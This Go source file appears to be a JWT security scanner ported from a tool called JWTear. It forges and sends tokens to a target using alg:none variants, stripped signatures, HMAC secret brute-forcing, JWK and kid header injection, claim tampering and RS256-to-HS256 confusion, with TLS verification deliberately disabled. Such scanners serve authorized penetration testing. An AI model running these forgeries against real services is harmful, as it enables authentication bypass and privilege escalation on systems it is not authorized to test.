package jwtscan

import (
	"crypto/rsa"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// invalidBaselineToken is a syntactically valid but never-signable JWT used
// to establish the "definitely unauthenticated" baseline response --
// identical to the one JWTear's CLI probes with.
const invalidBaselineToken = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJpbnZhbGlkIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

// probeTimeout bounds a single request against the target. Kept short (as
// in the original CLI) since every test is one more round-trip and a scan
// can run dozens to thousands of them.
const probeTimeout = 5 * time.Second

// newHTTPClient builds the client every probe reuses: TLS verification is
// disabled (this tool routinely targets self-signed lab/CTF boxes) and
// redirects are never followed, since a 3xx is itself a meaningful signal
// (a rejected token often gets redirected to a login page, not just 401'd).
// Proxy is left unset from the environment for the same reason the original
// CLI's requests.Session sets trust_env=False: consistent, un-intercepted
// behavior regardless of the host machine's proxy configuration.
func newHTTPClient() *http.Client {
	return &http.Client{
		Timeout: probeTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // deliberate: authorized testing against lab/CTF targets
		},
	}
}

// probeResult is the trimmed-down shape every test cares about: enough to
// run the same status+length heuristic JWTear's CLI uses, without holding
// the full response body in memory for the scan's duration.
type probeResult struct {
	StatusCode int
	Length     int
}

// probe sends token to targetURL via method, carrying it in a cookie named
// cookie if given, else as an Authorization: Bearer header, plus any
// extraHeaders.
func probe(client *http.Client, targetURL, token, method, cookie string, extraHeaders map[string]string) (*probeResult, error) {
	req, err := http.NewRequest(strings.ToUpper(method), targetURL, nil)
	if err != nil {
		return nil, err
	}
	for k, v := range extraHeaders {
		req.Header.Set(k, v)
	}
	if cookie != "" {
		req.AddCookie(&http.Cookie{Name: cookie, Value: token})
	} else {
		req.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 10<<20))
	if err != nil {
		return nil, err
	}
	return &probeResult{StatusCode: resp.StatusCode, Length: len(body)}, nil
}

// isHit decides whether resp looks like the authenticated (ok) baseline
// rather than the rejected (fail) one. A different status code is never a
// hit; identical status codes across both baselines fall back to a
// content-length tiebreaker. Ported directly from JWTear's core/http.py.
func isHit(resp, ok, fail *probeResult) bool {
	if resp.StatusCode != ok.StatusCode {
		return false
	}
	if ok.StatusCode != fail.StatusCode {
		return true
	}
	return absInt(resp.Length-ok.Length) < absInt(resp.Length-fail.Length)
}

func absInt(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

// TestStatus is the outcome of one misconfiguration check.
type TestStatus string

const (
	StatusVulnerable TestStatus = "vulnerable"
	StatusSafe       TestStatus = "safe"
	StatusSkipped    TestStatus = "skipped"
)

// Attempt is one forged token tried during a test -- kept for tests that
// try a handful of named variants (alg:none casing, kid payloads, claim
// patches) so the UI can show exactly which variant did or didn't land.
// Omitted for the weak-secret brute-force, whose attempt count can run into
// the thousands.
type Attempt struct {
	Label      string `json:"label"`
	Token      string `json:"token"`
	HTTPStatus int    `json:"httpStatus,omitempty"`
	Hit        bool   `json:"hit"`
	Error      string `json:"error,omitempty"`
}

// TestResult is one misconfiguration check's outcome, shaped for direct
// rendering as a pass/fail card in the UI.
type TestResult struct {
	ID       string     `json:"id"`
	Name     string     `json:"name"`
	Status   TestStatus `json:"status"`
	Summary  string     `json:"summary"`
	Token    string     `json:"token,omitempty"` // the forged token that worked, if vulnerable
	Attempts []Attempt  `json:"attempts,omitempty"`
}

// scanCtx carries everything a single test needs: the target + auth
// transport details, the parsed source token, and the two baseline
// responses every hit is judged against.
type scanCtx struct {
	client  *http.Client
	url     string
	method  string
	cookie  string
	headers map[string]string
	header  map[string]any
	payload map[string]any
	ok      *probeResult
	fail    *probeResult
}

func (c *scanCtx) probeToken(token string) (*probeResult, error) {
	return probe(c.client, c.url, token, c.method, c.cookie, c.headers)
}

func (c *scanCtx) hit(resp *probeResult) bool {
	return isHit(resp, c.ok, c.fail)
}

// attempt runs one forged token against the target and records it,
// tolerating a request failure (network error, timeout) as a non-hit
// rather than aborting the whole test.
func (c *scanCtx) attempt(label, token string) Attempt {
	resp, err := c.probeToken(token)
	if err != nil {
		return Attempt{Label: label, Token: token, Error: err.Error()}
	}
	return Attempt{Label: label, Token: token, HTTPStatus: resp.StatusCode, Hit: c.hit(resp)}
}

// testAlgNone tries every casing variant of alg:"none" -- some JWT
// libraries only special-case the exact lowercase string, so mixed case can
// smuggle an unsigned token past a naive check.
func (c *scanCtx) testAlgNone() TestResult {
	res := TestResult{ID: "alg_none", Name: "alg:none Attack"}
	for _, variant := range []string{"none", "None", "NONE", "nOnE"} {
		h := cloneMap(c.header)
		h["alg"] = variant
		token, err := buildJWT(h, c.payload, nil)
		if err != nil {
			continue
		}
		a := c.attempt(fmt.Sprintf("alg: %q", variant), token)
		res.Attempts = append(res.Attempts, a)
		if a.Hit {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Server accepted an unsigned token with alg set to %q", variant)
			res.Token = token
			return res
		}
	}
	res.Status = StatusSafe
	res.Summary = "Server rejected every alg:none casing variant"
	return res
}

// testEmptySig strips the signature segment entirely while keeping the
// original header/payload and algorithm claim untouched.
func (c *scanCtx) testEmptySig() TestResult {
	res := TestResult{ID: "empty_sig", Name: "Empty Signature"}
	hBytes, _ := json.Marshal(c.header)
	pBytes, _ := json.Marshal(c.payload)
	token := b64enc(hBytes) + "." + b64enc(pBytes) + "."

	a := c.attempt("signature segment stripped", token)
	res.Attempts = []Attempt{a}
	if a.Hit {
		res.Status = StatusVulnerable
		res.Summary = "Server accepted the token with its signature segment stripped entirely"
		res.Token = token
	} else {
		res.Status = StatusSafe
		res.Summary = "Server rejected the token once its signature was stripped"
	}
	return res
}

// testWeakSecret brute-forces the HMAC secret against secrets (the built-in
// list plus any caller-supplied extras, already capped by RunScan). Skipped
// entirely for non-HMAC algorithms, since there's no secret to guess.
func (c *scanCtx) testWeakSecret(secrets []string) (TestResult, *string) {
	res := TestResult{ID: "weak_secret", Name: "Weak HMAC Secret Brute-Force"}
	alg, _ := c.header["alg"].(string)
	if !strings.HasPrefix(strings.ToUpper(alg), "HS") {
		res.Status = StatusSkipped
		res.Summary = fmt.Sprintf("alg=%q is not HMAC-based -- skipping", alg)
		return res, nil
	}

	for _, secret := range secrets {
		token, err := buildJWT(c.header, c.payload, []byte(secret))
		if err != nil {
			continue
		}
		resp, err := c.probeToken(token)
		if err != nil {
			continue
		}
		if c.hit(resp) {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Cracked HMAC secret after trying %d candidate(s): %q", len(secrets), secret)
			res.Token = token
			return res, &secret
		}
	}
	res.Status = StatusSafe
	res.Summary = fmt.Sprintf("No match found across %d candidate secret(s)", len(secrets))
	return res, nil
}

// rsaKeypair is generated once, lazily, and reused by every JWK-injection
// test on this server -- mirroring JWTear's CLI generating it once at
// import time rather than paying 2048-bit keygen cost on every scan.
var (
	rsaKeypairOnce sync.Once
	rsaKeypair     *rsa.PrivateKey
	rsaKeypairErr  error
)

func getRSAKeypair() (*rsa.PrivateKey, error) {
	rsaKeypairOnce.Do(func() {
		rsaKeypair, rsaKeypairErr = generateRSAKeypair()
	})
	return rsaKeypair, rsaKeypairErr
}

// testJWKInjection embeds an attacker-generated RSA public key directly in
// the forged token's header ("jwk") and signs with the matching private
// key. A server that resolves the verification key from the token's own
// header, instead of trusting only its own configured keys, will accept it.
func (c *scanCtx) testJWKInjection() TestResult {
	res := TestResult{ID: "jwk_injection", Name: "JWK Header Injection"}

	priv, err := getRSAKeypair()
	if err != nil {
		res.Status = StatusSkipped
		res.Summary = "Could not generate an RSA key pair: " + err.Error()
		return res
	}

	h := map[string]any{}
	for k, v := range c.header {
		if k == "kid" || k == "jku" || k == "x5u" || k == "x5c" {
			continue
		}
		h[k] = v
	}
	h["alg"] = "RS256"
	h["jwk"] = jwkFromPublicKey(&priv.PublicKey)

	token, err := buildJWTRSA(h, c.payload, priv)
	if err != nil {
		res.Status = StatusSkipped
		res.Summary = "Could not sign forged token: " + err.Error()
		return res
	}

	a := c.attempt("RS256 signed with an embedded attacker key", token)
	res.Attempts = []Attempt{a}
	if a.Hit {
		res.Status = StatusVulnerable
		res.Summary = "Server accepted an attacker-embedded RSA public key via the jwk header"
		res.Token = token
	} else {
		res.Status = StatusSafe
		res.Summary = "Server rejected the embedded-JWK token"
	}
	return res
}

// testKidInjection tries kid header values shaped to make a naive
// "read a key file/DB row named by kid" implementation resolve to a
// predictable (often empty or attacker-known) secret -- path traversal to
// well-known files, SQL injection, and a null byte.
func (c *scanCtx) testKidInjection() TestResult {
	res := TestResult{ID: "kid_injection", Name: "kid Header Injection"}
	baseAlg, _ := c.header["alg"].(string)
	useAlg := baseAlg
	if !strings.HasPrefix(strings.ToUpper(baseAlg), "HS") {
		useAlg = "HS256"
	}

	for _, kp := range kidPayloads {
		h := cloneMap(c.header)
		h["alg"] = useAlg
		h["kid"] = kp.Kid
		token, err := buildJWT(h, c.payload, kp.Secret)
		if err != nil {
			continue
		}
		a := c.attempt(fmt.Sprintf("%s (kid=%q, secret=%q)", kp.Name, kp.Kid, kp.Secret), token)
		res.Attempts = append(res.Attempts, a)
		if a.Hit {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Server accepted kid=%q signed with secret %q (%s)", kp.Kid, kp.Secret, kp.Name)
			res.Token = token
			return res
		}
	}
	res.Status = StatusSafe
	res.Summary = "Server rejected every kid-injection payload"
	return res
}

// testClaimTampering tries a battery of privilege-escalation claim
// overrides, first unsigned (alg:none) and -- if the weak-secret test
// already cracked the HMAC secret -- again properly re-signed with it. The
// re-signed variant catches a server that correctly rejects alg:none but
// would still trust a completely valid signature over tampered claims.
func (c *scanCtx) testClaimTampering(foundSecret *string) TestResult {
	res := TestResult{ID: "claim_tampering", Name: "Claim Tampering"}
	alg, _ := c.header["alg"].(string)
	var found bool

	for _, cp := range claimPatches {
		p := cloneMap(c.payload)
		for k, v := range cp.Patch {
			p[k] = v
		}

		hNone := cloneMap(c.header)
		hNone["alg"] = "none"
		token, err := buildJWT(hNone, p, nil)
		if err == nil {
			a := c.attempt(cp.Desc+" (alg:none)", token)
			res.Attempts = append(res.Attempts, a)
			if a.Hit {
				found = true
				if res.Token == "" {
					res.Token = token
				}
			}
		}

		if foundSecret != nil && strings.HasPrefix(strings.ToUpper(alg), "HS") {
			token, err := buildJWT(c.header, p, []byte(*foundSecret))
			if err == nil {
				a := c.attempt(cp.Desc+" (re-signed with cracked secret)", token)
				res.Attempts = append(res.Attempts, a)
				if a.Hit {
					found = true
					if res.Token == "" {
						res.Token = token
					}
				}
			}
		}
	}

	if found {
		res.Status = StatusVulnerable
		res.Summary = "At least one privilege-escalation claim override was accepted"
	} else {
		res.Status = StatusSafe
		res.Summary = "No privilege-escalation claim override was accepted"
	}
	return res
}

// testRS256HS256 tries the classic algorithm-confusion attack: sign an
// HS256 token using the server's own RSA public key bytes as the HMAC
// secret. A server that verifies "whatever alg the token claims" using the
// same public key object for both RS256 and HS256 will treat the public key
// as a shared secret it never intended to be one.
//
// manualPEM, if given, is used verbatim and takes priority over discovery.
// Otherwise every auto-discovered candidate (see discoverPublicKeyPEM) is
// tried in turn -- there's rarely more than one or two, since discovery
// stops at the first source that yields a key.
func (c *scanCtx) testRS256HS256(manualPEM string, discovered []pemCandidate) TestResult {
	res := TestResult{ID: "rs256_hs256_confusion", Name: "RS256 → HS256 Algorithm Confusion"}

	candidates := discovered
	if strings.TrimSpace(manualPEM) != "" {
		candidates = []pemCandidate{{PEM: manualPEM, Source: "manually provided"}}
	}
	if len(candidates) == 0 {
		res.Status = StatusSkipped
		res.Summary = "No RS256 public key was provided, and none could be auto-discovered from the target -- paste one manually to enable this test"
		return res
	}

	for _, cand := range candidates {
		h := cloneMap(c.header)
		h["alg"] = "HS256"
		token, err := buildJWT(h, c.payload, []byte(cand.PEM))
		if err != nil {
			continue
		}
		a := c.attempt(fmt.Sprintf("HS256 signed with public key from %s", cand.Source), token)
		res.Attempts = append(res.Attempts, a)
		if a.Hit {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Server accepted its own RSA public key (%s) used as an HMAC secret", cand.Source)
			res.Token = token
			return res
		}
	}

	res.Status = StatusSafe
	if candidates[0].Source == "manually provided" {
		res.Summary = "Server rejected the RS256→HS256 confusion token"
	} else {
		res.Summary = fmt.Sprintf("Auto-discovered a public key (%s) but the server rejected it as an HMAC secret", candidates[0].Source)
	}
	return res
}
